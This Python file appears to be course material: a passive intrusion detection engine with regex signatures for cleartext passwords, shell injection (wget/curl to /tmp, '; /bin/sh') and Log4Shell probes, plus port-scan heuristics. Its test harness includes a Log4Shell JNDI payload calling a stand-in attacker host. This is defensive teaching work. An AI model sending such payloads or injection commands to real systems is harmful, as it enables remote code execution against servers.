"""
Passive Network Packet Sniffer & Signature-Based Intrusion Detection System (IDS) Engine
Author: Sukanta Hui | Institution: Coder & AccoTax Barrackpore
Course: Cyber Security - Module 005_002 (Topic 0)
"""

import re
import time
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple

@dataclass
class SniffedPacket:
    timestamp: float
    src_ip: str
    src_port: int
    dst_ip: str
    dst_port: int
    protocol: str
    tcp_flags: str  # e.g., "SYN", "ACK", "FIN_PSH_URG"
    payload: bytes

@dataclass
class IdsAlert:
    alert_id: int
    timestamp_utc: str
    severity: str  # "LOW", "MEDIUM", "HIGH", "CRITICAL"
    signature_id: str
    signature_name: str
    src_ip: str
    dst_ip: str
    details: str

class PassiveIntrusionDetectionEngine:
    def __init__(self):
        self.alerts: List[IdsAlert] = []
        self.alert_counter = 1

        # Port scanning tracking state (Src IP -> list of timestamps and target ports)
        self.syn_tracker: Dict[str, List[Tuple[float, int]]] = {}

        # Signature Rules Database (Regex patterns on raw payload bytes)
        self.payload_signatures = [
            ("SID-1001", "CLEAR_TEXT_PASSWORD", "MEDIUM",
             re.compile(rb"(password|passwd|pwd)\s*=\s*[^\s&]+", re.IGNORECASE)),
            ("SID-1002", "SUSPICIOUS_SHELL_INJECTION", "CRITICAL",
             re.compile(rb"(\b(cat|chmod|wget|curl)\b\s+/tmp/|;\s*/bin/sh\b)", re.IGNORECASE)),
            ("SID-1003", "LOG4SHELL_JNDI_PROBE", "CRITICAL",
             re.compile(rb"\$\{jndi:(ldap|rmi|dns):", re.IGNORECASE))
        ]

    def analyze_packet(self, pkt: SniffedPacket) -> List[IdsAlert]:
        """Passively analyzes sniffed packet against signature and behavioral heuristic rules."""
        generated_alerts = []
        current_time_str = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(pkt.timestamp))

        # Check 1: Malformed TCP Flag Inspection (XMAS / NULL scans)
        if pkt.tcp_flags == "FIN_PSH_URG":
            alert = IdsAlert(
                self.alert_counter, current_time_str, "HIGH", "SID-2001",
                "RECONNAISSANCE: TCP XMAS Scan Detected (FIN-PSH-URG Flags Set)",
                pkt.src_ip, pkt.dst_ip,
                f"Adversary probe from {pkt.src_ip}:{pkt.src_port} targeting {pkt.dst_ip}:{pkt.dst_port}"
            )
            self.alert_counter += 1
            self.alerts.append(alert)
            generated_alerts.append(alert)

        # Check 2: SYN Port Sweep Behavioral Heuristics (>= 3 distinct ports in 5 seconds)
        if pkt.tcp_flags == "SYN":
            if pkt.src_ip not in self.syn_tracker:
                self.syn_tracker[pkt.src_ip] = []
            self.syn_tracker[pkt.src_ip].append((pkt.timestamp, pkt.dst_port))

            # Prune events older than 5 seconds
            self.syn_tracker[pkt.src_ip] = [
                (t, p) for t, p in self.syn_tracker[pkt.src_ip] if pkt.timestamp - t <= 5.0
            ]

            unique_ports = {p for _, p in self.syn_tracker[pkt.src_ip]}
            if len(unique_ports) >= 3:
                alert = IdsAlert(
                    self.alert_counter, current_time_str, "MEDIUM", "SID-2002",
                    f"RECONNAISSANCE: TCP Port Sweep Detected ({len(unique_ports)} ports scanned in <5s)",
                    pkt.src_ip, pkt.dst_ip,
                    f"Host {pkt.src_ip} swept ports: {sorted(list(unique_ports))}"
                )
                self.alert_counter += 1
                self.alerts.append(alert)
                generated_alerts.append(alert)
                self.syn_tracker[pkt.src_ip].clear()  # Reset after alert

        # Check 3: Deep Payload Byte Matching
        for sid, name, severity, pattern in self.payload_signatures:
            if pattern.search(pkt.payload):
                alert = IdsAlert(
                    self.alert_counter, current_time_str, severity, sid,
                    f"EXPLOIT_SIGNATURE: {name} matched in payload",
                    pkt.src_ip, pkt.dst_ip,
                    f"Matched signature pattern: {name} on port {pkt.dst_port}"
                )
                self.alert_counter += 1
                self.alerts.append(alert)
                generated_alerts.append(alert)

        return generated_alerts

# Execution Test Harness
if __name__ == "__main__":
    ids = PassiveIntrusionDetectionEngine()
    print("=== Passive Intrusion Detection System (IDS) Engine ===")

    now = time.time()
    test_packets = [
        # Packet 1: Normal HTTPS handshake
        SniffedPacket(now, "10.10.1.50", 54100, "172.16.1.10", 443, "TCP", "SYN", b""),

        # Packet 2: Cleartext password on unencrypted HTTP
        SniffedPacket(now + 0.1, "10.10.1.50", 54102, "172.16.1.20", 80, "TCP", "ACK", b"POST /login HTTP/1.1\r\nusername=admin&password=SecretPassword123"),

        # Packets 3-5: Rapid Port Sweep from external attacker
        SniffedPacket(now + 0.5, "198.51.100.25", 48101, "172.16.1.10", 22, "TCP", "SYN", b""),
        SniffedPacket(now + 0.6, "198.51.100.25", 48102, "172.16.1.10", 80, "TCP", "SYN", b""),
        SniffedPacket(now + 0.7, "198.51.100.25", 48103, "172.16.1.10", 443, "TCP", "SYN", b""),

        # Packet 6: Log4Shell JNDI exploit injection in User-Agent
        SniffedPacket(now + 1.2, "198.51.100.99", 59000, "172.16.1.10", 443, "TCP", "ACK", b"GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://attacker.com/a}\r\n\r\n")
    ]

    for p in test_packets:
        alerts = ids.analyze_packet(p)
        for a in alerts:
            print(f"🚨 [ALERT #{a.alert_id}] [{a.severity}] {a.signature_name} ({a.src_ip} -> {a.dst_ip})")
            print(f"    ↳ Details: {a.details}")
